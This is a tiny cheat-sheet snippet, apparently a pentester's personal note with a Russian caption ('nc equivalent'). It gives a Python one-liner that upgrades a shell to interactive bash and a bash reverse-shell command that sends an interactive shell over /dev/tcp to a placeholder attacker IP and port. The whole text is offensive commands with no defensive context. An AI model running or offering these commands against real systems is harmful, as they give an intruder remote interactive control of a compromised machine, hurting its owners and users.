```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
аналог nc:
```
bash -c "bash -i >& /dev/tcp/{your_IP}/{your_listeniing_port} 0>&1"
```
